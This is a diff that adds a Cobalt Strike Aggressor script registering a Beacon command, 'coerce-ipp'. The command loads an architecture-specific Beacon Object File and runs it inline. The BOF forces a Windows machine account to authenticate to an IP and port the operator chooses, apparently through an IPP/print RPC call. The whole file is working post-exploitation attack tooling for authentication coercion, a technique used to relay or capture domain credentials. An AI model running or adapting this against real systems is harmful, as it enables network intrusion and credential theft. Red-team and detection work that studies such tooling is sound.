@@ -1,0 +1,34 @@
+beacon_command_register(
+    "coerce-ipp",
+    "Coerce machine account auth via AssocIppDirected",
+    "Usage: coerce-ipp <ip> <port>",
+    "bof"
+);
+
+alias coerce-ipp {
+    local('$barch $handle $data $args $ip $port');
+
+    $barch = barch($1);
+
+    $handle = openf(script_resource("coerce-ipp. $+ $barch $+ .o"));
+    if ($handle == -1) {
+        berror($1, "coerce-ipp: could not read coerce-ipp. $+ $barch $+ .o");
+        return;
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $ip = iff(-istrue $2, $2, "");
+    $port = iff(-istrue $3, $3 + 0, -1);
+
+    if ($ip eq "" || $port == -1) {
+        berror($1, "Usage: coerce-ipp <ip> <port>");
+        return;
+    }
+
+    $args = bof_pack($1, "zi", $ip, $port);
+
+    btask($1, "Tasked beacon to coerce machine account auth to " . $ip . ":" . $port);
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
